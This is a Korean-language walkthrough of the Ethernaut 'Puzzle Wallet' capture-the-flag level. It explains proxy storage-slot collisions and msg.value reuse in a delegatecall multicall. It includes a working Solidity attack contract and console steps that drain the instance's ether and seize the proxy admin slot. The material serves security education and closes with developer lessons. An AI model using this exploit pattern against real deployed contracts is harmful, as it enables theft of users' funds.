https://teberr.notion.site/Ethernaut-Puzzle-Wallet-0da48486c83d4fb1a28fab606bc8b14b

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c1b8f8c5-6113-46e7-be86-e95427fddc98/Untitled.png)

> 오늘날에는 Defi 작업에 대해 비용을 지불하는 것이 불가능합니다.

우리 친구들은 여러 트랜잭션을 모아서 하나의 트랜잭션에 배치하여 비용을 줄이는 방법을 발견했습니다. 그래서 스마트 컨트랙트를 작성했죠

그들은 코드에 버그가 포함된 경우 코드를 업그레이드 할 수 있는 컨트랙트가 필요했고 외부의 인원이 이를 사용하는 것을 막고 싶었습니다. 

그래서 스마트 컨트랙트를 업그레이드 할 수 있는 Admin과 컨트랙트에 접근하여 사용할 수 있는 화이트리스트를 관리하는 owner를 정했습니다.   

컨트랙트를 배포하고 우리 친구들만을 화이트리스트로 정했습니다. 

아직 그들은 위험하다는 것을 모르고 있습니다… 프록시의 admin이 되기 위해서 지갑을 하이재킹해주세요!

- delegatecall에 대해 이해해야 합니다.
- Proxy 패턴에 대해 이해해야 합니다.
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

# 코드 분석 및 공격 설계

이 문제는 프록시 패턴으로 구성이 되어있다. 프록시 패턴을 먼저 살짝 알아보자.

### 프록시 패턴

프록시 패턴은 데이터 저장을 위한 스토리지 계층과 직접적인 로직이 구현되어있는 로직 계층을 나누는 형태이다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bfa7e510-6722-40be-8cc7-921d05a6ec53/Untitled.png)

이러한 형태로 구성하여 Delegatecall을 사용하여 Proxy Contract 에서 Logic Contract에 있는 함수들을 실행가능하게 한다.

이로 인하여 Proxy Contract에서 Logic Contract가 실행되는 효과가 일어나 상태의 변화는 프록시 컨트랙트에 저장이 된다.  

이렇게 구분하는 이유는 먼저 한번 Deploy(배포)하고 나면 수정이 불가능한 블록체인 특성상 로직에 결함이 발견되었을 경우에 대처가 불가능하기 때문이다. 컨트랙트를 아예 새로 배포하자니 기존에 저장되어 있던 스토리지 정보들을 복구하기가 힘들기도 하고 비용이 너무 많이 들게 된다.

하지만 프록시 패턴으로 스토리지 계층과 로직 계층을 구분할 경우 프록시 계층에서 연결되어 있는 로직 컨트랙트만 변경하면 되기 때문에 스토리지 계층에 저장되어 있는 데이터는 보존하고 비용을 아낄 수 있어 프록시 패턴을 사용한다.

### 문제의 프록시 패턴 스토리지 충돌

이 문제에서는 Puzzle Wallet 컨트랙트가 Logic Contract이고 Puzzle Proxy가 스토리지 계층인 프록시 컨트랙트이다. 

그런데 이 문제에서 취약한점이 있다면 Puzzle Wallet(Logic Contract)에의 상태 변수슬롯과 Proxy에의 상태변수 슬롯이 겹쳐 스토리지 충돌이 일어날 수 있다는 점이다. 

일반적으로 이러한 충돌을 막기 위해서는 변수가 저장되는 슬롯 넘버가 겹치지 않도록 구성한다. 하지만 이 문제에서는 슬롯이 겹치게 되어 문제가 생긴다.

따라서 Logic Contract의 상태변수를 변경하는 함수가 있을 때 이 Logic Contract의 상태 변수를 변경하려는 함수를 프록시컨트랙트에서 delegatecall로 실행시키기 때문에 로직 컨트랙트가 변경하는 변수에 대응되는 프록시 컨트랙트의 슬롯이 변경되게 된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e5526e96-fd5c-4192-81b6-b5fa9a48eacf/Untitled.png)

따라서 이 문제에서는 PuzzleWallet의 owner에 대응하는 Proxy 변수는 pendingAdmin 이고, PuzzleWallet의 maxBalance에 대응하는 Proxy 변수는 admin이다.

pendingAdmin  ←———→ owner

admin ←——→ maxBalance

### 문제 코드 분석

먼저 Proxy 코드를 분석해보자.

### PuzzleProxy

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}
```

상태 변수는 슬롯0에 pendingAdmin, 슬롯1에 admin이 존재한다.

함수는 세가지가 존재한다.

1. proposeNewAdmin - pendingAdmin의 값을 변경한다.
2. approveNewAdmin - admin을 pendingAdmin으로 변경한다. admin만 실행 가능하다.
3. upgradeTo - 로직 컨트랙트를 변경한다. admin만 실행할 수 있다.

proposeNewAdmin은 제한이 없기 때문에 우리가 호출을 통해서 pendingAdmin의 값을 변경할 수 있다.

### PuzzleWallet

Wallet 코드를 분석해보자. (로직 컨트랙트이다.)

```solidity
contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

상태변수는 네개가 존재한다.

slot 0 : owner (proxy의 pendingAdmin과 겹침)

slot 1 : maxBalance(proxy의 admin과 겹침)

slot 2 : whitelisted

slot 3 : balances

함수는 총 6가지가 존재한다.

1. init - maxBalance가 0인경우 maxBalance값과 owner를 변경한다. (하지만 프록시에서 실행할 경우 이에 대응하는 admin값이 0인 경우로 해석되는데 admin은 0이 아니므로 프록시를 통해서는 실행이 불가능하다)
2. setMaxBalance - 이 주소에 있는 이더가 0이라면 maxBalance를 변경한다. whitelist에 등록된 주소만 실행이 가능하며 이더는 0.001개 존재하여 실행이 불가능하다.
3. addToWhitelist - 호출자가 owner(proxy를 통해서 호출할 경우 pendingAdmin)이라면 전달받은 addr을 whitelist에 등록한다.
4. deposit - 호출자의 balances 를 함수 호출시 전달받은 이더의 양을 의미하는 전역변수 msg.value를 증가시킨다.whitelist에 등록된 주소만 실행가능하다.
5. execute - msg.sender의 balances 값이 출금하려는 value 이상이어야 하며 주소 to에게 data와 value만큼의 이더를 전송한다. whitelist에 등록된 주소만 실행가능하다.
6. multicall - 하나의 트랜잭션에서 여러개의 함수(내부 트랜잭션)가 실행되도록 한다. 이로 인해서 전역변수인 msg.value와 같은 값은 하나의 트랜잭션이므로 유지가 되며 이 때 실행되는 함수 중 함수 시그니쳐가 deposit일 경우 두 번 호출되지 않도록 if로 막아주고 있다. 실행되는 함수들은 delegatecall로 실행되므로 context가 유지되며 실행된다. 즉 proxy를 통해서 실행될 경우 전달받은 data에 담긴 함수들이 proxy에서 실행되는 것과 같은 효과를 갖는다.

이 문제의 목적은 admin의 권한을 얻는 것이다. admin 권한을 얻기 위해서는 다음과 같은 과정을 거쳐야 한다.

1. 프록시에 직접 proposeNewAdmin을 호출하여 pendingAdmin을 바꾼다.
2. 프록시를 통해 로직 컨트랙트의 addToWhitelist로(슬롯 0이 프록시의 것을 사용하기 때문에 owner 권한을 얻었으므로 실행 가능) 내 공격 컨트랙트의 주소를 등록한다.
3. 공격 컨트랙트에서 프록시 컨트랙트의 이더를 전부 탈취한다. 
4. 프록시에서 setMaxBalance를 통해 프록시의 슬롯 1번째(admin)을 를 내 메타마스크 주소로 변경한다.

# 공격

먼저 알아두어야 할 것이 있다. 

일반적으로 프록시 패턴에서 사용자는 ‘프록시’와 상호작용하게 된다. 그런데 이 문제의 인스턴스를 받아서 abi를 확인해보면

```solidity
await contract.abi
(10) [{…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}]
0:{inputs: Array(1), name: 'addToWhitelist', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
1:{inputs: Array(1), name: 'balances', outputs: Array(1), stateMutability: 'view', type: 'function', …}
2:{inputs: Array(0), name: 'deposit', outputs: Array(0), stateMutability: 'payable', type: 'function', …}
3:{inputs: Array(3), name: 'execute', outputs: Array(0), stateMutability: 'payable', type: 'function', …}
4:{inputs: Array(1), name: 'init', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
5:{inputs: Array(0), name: 'maxBalance', outputs: Array(1), stateMutability: 'view', type: 'function', …}
6:{inputs: Array(1), name: 'multicall', outputs: Array(0), stateMutability: 'payable', type: 'function', …}
7:{inputs: Array(0), name: 'owner', outputs: Array(1), stateMutability: 'view', type: 'function', …}
8:{inputs: Array(1), name: 'setMaxBalance', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}
9:{inputs: Array(1), name: 'whitelisted', outputs: Array(1), stateMutability: 'view', type: 'function', …}
```

Proxy의 함수들이 아닌 Wallet의 함수들이 등록되어 있다. 하지만 이는 편의성을 위하여 이더넛에서 abi를 Wallet의 함수들로 등록을 해둔 것일 뿐 실제로는 프록시와 상호작용하는 것이므로 contract의 주소는 Proxy의 주소로 생각하는 것이 맞다.

그렇다면 우리는 어떤 함수를 실행시킬 수 있는지를 생각해보아야 한다.

우리가 현재 실행할 수 있는 함수는 Proxy의 newProposeAdmin()밖에 존재하지 않는다. 근데 이는 아쉽게도 이더넛에서 abi를 제공하지 않고 있기 때문에 직접 컨트랙트 주소를 통해 newProposeAdmin()을 호출해야한다.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface PuzzleProxy{
    function pendingAdmin()external returns(address);
    function admin()external returns(address);
    function proposeNewAdmin(address) external ;
}

contract PuzzleWalletAttack{
    PuzzleProxy public target;
    address public proxy_admin;
    address public proxy_pendingadmin;

    constructor(address _target){
        target=PuzzleProxy(_target);
    }
    function ProxyAdmin()public{
        proxy_admin=target.admin();
    }

    function proxyPendingAdmin()public{
        proxy_pendingadmin=target.pendingAdmin();
    }

    function NewAdmin() public {
        target.proposeNewAdmin(msg.sender);
    }

}
```

![pendingAdmin 변경.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d24b197-5229-42e4-9186-d8fe921e6b42/pendingAdmin_%EB%B3%80%EA%B2%BD.png)

web3.eth.sendTransaction({from:player,to:contract.address,data:data})를 통해 호출하는 방법도 있지만 이 newProposeAdmin()은 msg.sender와 같은 값을 넣어주거나 하지 않아 호출하는 주소는 상관없으므로 조금 더 편리한 리믹스로 작성하여 호출하였다. (msg.sender를 등록하는 것이라면 콘솔에서 해야 내 메타마스크 주소가 됨. 안그러면 리믹스에서 배포한 컨트랙트 주소로 등록된다.)

그래서 호출 후 proxy_pendingAdmin(첫번째 슬롯값)을 확인해보면 pendingAdmin 값이 내 메타마스크 주소로 변경된 것을 볼 수 있다. 

```solidity
await contract.addToWhitelist(player)

await contract.whitelisted(player)
-> true
```

이제 프록시를 통해 PuzzleWallet에 접근하게 되면 스토리지는 프록시의 것을 기준으로 참조하므로 owner가 내 메타마스크 주소로 인지되어 프록시의 addToWhitelist(address)를 통해 원하는 주소를 화이트리스트에 추가할 수 있다.

이제 이 proxy에 있는 이더를 탈취하기 위해서는 execute를 통해 탈취해야하는데 execute를 호출하기 위해서는 두가지 조건이 필요하다.

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
				balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }
```

execute를 실행하기 위한 조건은 다음과 같다.

1. execute를 호출한 주소가 whitelisted에 등록되어있어야 한다.
2. execute를 호출한 주소의 balances가 출금하려는 value 값 이상이어야 한다.

1은 admin 의 값을 내 메타마스크 주소로 변경하였기 때문에 콘솔에서 프록시를 거쳐 addToWhitelist를 호출하여 등록시키면 된다.

```solidity
await getBalance(contract.address)

'0.001'
```

2번이 문제인데 이 프록시에 있는 이더는 0.001이더이다. 내 balances에 저장된 값을 높이기 위해 이더를 deposit()함수를 호출해 프록시에 넣는다면 내가 넣은 양만큼 컨트랙트에 있는 이더양의 늘어나게 되고 내가 넣은 양만큼 출금이 가능하므로 전체 이더를 다 탈취할 수 없게 된다.

어떻게 해야 내가 넣은 이더의 양보다 더 많이 탈취하기 위해 balances[내 주소]의 값을 속일 수 있을까?

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
```

이는 multicall을 사용하면 된다. multicall에서 data에 담긴 함수를 호출할 때 시그니쳐 값이 deposit이면 지역변수 depositCalled를 true로 변경하여 deposit이 다시 실행되지 않도록 검사를 한다.

하지만 data[0]=deposit(), data[1]=multicall(deposit())이라면 어떻게 될까?

data[0]이 먼저 실행이 되면서 전역변수 msg.value만큼 deposit() 함수가 실행되며 msg.sender의 balances가 증가할 것이다. 이제 다시 deposit()을 실행시킬 수는 없다. 

하지만 여기서 data[1]에 담겨있는 값인 multicall(deposit())을 실행시키게 되면 multicall(2)이 호출되면서 multicall(2)에 있는 지역변수 depositCalled는 false이기 때문에 다시 deposit()을 실행시킬 수 있다. 

이 때 deposit()이 실행될 때 balances[msg.sender]+=msg.value 에 들어있는 전역 변수 값들은 delegatecall(data[i])로 delegatecall로 실행되기 때문에 전역변수가 유지되는 특성으로 인해 유지된다.

따라서 실제 전송한 이더는 0.001이더이지만 deposit()이 두번 호출되어 내 balance는 0.002가 되고 컨트랙트에 존재하는 총 이더인 0.002를 탈취할 수 있게 된다. 

이를 수행할 수 있도록 공격 컨트랙트를 작성하자.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface PuzzleProxy{
    function pendingAdmin()external returns(address);
    function admin()external returns(address);
    function proposeNewAdmin(address) external ;
    function multicall(bytes[] calldata)external payable;
    function execute(address, uint256, bytes calldata) external;
}

contract PuzzleWalletAttack{
    PuzzleProxy public target;
    address public proxy_admin;
    address public proxy_pendingadmin;
    bytes[] public data = new bytes[](2);
    bytes[] public data2 = new bytes[](1);

    constructor(address _target){
        target=PuzzleProxy(_target);
    }
    function ProxyAdmin()public{
        proxy_admin=target.admin();
    }

    function proxyPendingAdmin()public{
        proxy_pendingadmin=target.pendingAdmin();
    }

    function NewAdmin() public {
        target.proposeNewAdmin(msg.sender);
    }

    function attack()public {
        data[0]=abi.encodeWithSignature("deposit()");
        data2[0]=abi.encodeWithSignature("deposit()");
        data[1]=abi.encodeWithSignature("multicall(bytes[])",data2);

        target.multicall{value: 0.001 ether}(data);
    }

    function sweepfunds()public{
        target.execute(msg.sender,0.002 ether,"");
    }

    fallback() external payable{

    }
}
--------------------------------------------------
주소 : 0x771f1551D5Ed848237ea1FA41137be49375558cb
```

이제 이 공격 컨트랙트의 주소를 화이트리스트에 등록하자.

```solidity
await contract.addToWhitelist('0x771f1551D5Ed848237ea1FA41137be49375558cb')

await contract.whitelisted('0x771f1551D5Ed848237ea1FA41137be49375558cb')
true
```

그리고 이 공격 컨트랙트에서 0.001이더를 보내면서 balances를 증가시켜야 하므로 이 공격 컨트랙트로 0.001이더를 보내놓자.

![0.001이더 전송.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e55f208-14a0-4b1f-8e33-cefd9e3574f2/0.001%EC%9D%B4%EB%8D%94_%EC%A0%84%EC%86%A1.png)

![이더 도착.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c072c66e-1b45-41c9-9122-b87bfdae568b/%EC%9D%B4%EB%8D%94_%EB%8F%84%EC%B0%A9.png)

그러면 공격 자금인 0.001이더가 도착했으므로 이제 공격을 진행하여 컨트랙트의 balances를 0.002이더로 만들자.

```solidity
(await contract.balances('0x771f1551D5Ed848237ea1FA41137be49375558cb')).toNumber()
2000000000000000
```

attack() 함수를 실행한 후 balances 값을 보면 0.001이더만 전송했는데 0.002이더로 balances가 설정된 것을 볼 수 있다. 이제 내 공격컨트랙트에서 sweepfunds 함수를 통해 execute를 실행시켜서 프록시 컨트랙트에 있는 모든 이더를 탈취하자.

```solidity
await getBalance(contract.address)
'0'
```

인스턴스의 이더가 전부 탈취된 것을 볼 수 있다. 이제 이더가 0이므로 프록시에서 setMaxBalance를 호출하여 프록시의 1번째 슬롯인 admin을 변경할 수 있다.

인자는 uint256형태이므로 내 메타마스크 주소를 uint256 형태로 바꾸어서 인자로 전달을 해줘야한다.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.5;

contract test{
    uint256 public result;
    function encode() public {
        result = uint256(uint160(msg.sender));
    }
}
```

![내 메타마스크 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/390b6871-e02c-4e90-bb5a-0f21f5ec8243/%EB%82%B4_%EB%A9%94%ED%83%80%EB%A7%88%EC%8A%A4%ED%81%AC_%EC%A3%BC%EC%86%8C.png)

내 메타마스크 주소를 uint256으로 변환한 결과는 `751856855013772392084094884552209194018036163482`이다. 

이제 이 값을 인자로 프록시를 거쳐서 setMaxBalance를 실행시켜 프록시의 슬롯1인 admin을 변경해주자.

```solidity
await contract.setMaxBalance(751856855013772392084094884552209194018036163482)
await web3.eth.getStorageAt(contract.address,1)
'0x00000000000000000000000083b26d6a3d3fabd9f0a5f1d69dca1ce6cc4ea39a'
```

프록시의 1번째 슬롯인 admin의 위치에 내 메타마스크 주소를 넣었다! 즉 admin 권한을 획득한 것이므로 문제 인스턴스를 제출하자.

 

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fc6df2de-2438-4644-b10e-3920eed07f2c/%EC%84%B1%EA%B3%B5.png)

# 후기

프록시 패턴을 사용해서 컨트랙트의 업그레이드 기능을 구현하고 배포하는 가스 비용을 줄이는 경우가 많다. 하지만 이런 경우 스토리지 슬롯 넘버가 같으면 충돌이 일어나서 의도하지 않은 실행이 될 수 있기 때문에 이를 고려해서 구현해야 한다. 

또한 이더리움의 양을 코드에 쓰기 위해 msg.value를 사용하는 경우 이더는 소비되더라도 전역 변수인 msg.value는 하나의 트랜잭션 내에서 계속해서 유지된다. 따라서 개발자는 이더를 소비한 이후 실제 남은 이더를 수동으로 추적해야 한다. 

또한 multi-call 패턴의 위험성도 볼 수 있다. delegatecall을 이용해서 multi-call 을 구현하게 될 경우 컨트랙트로 보내진 원본 msg.value가 유지되므로 원하지 않은 이더의 전송이 일어날 수 있음에 유의해야 한다.
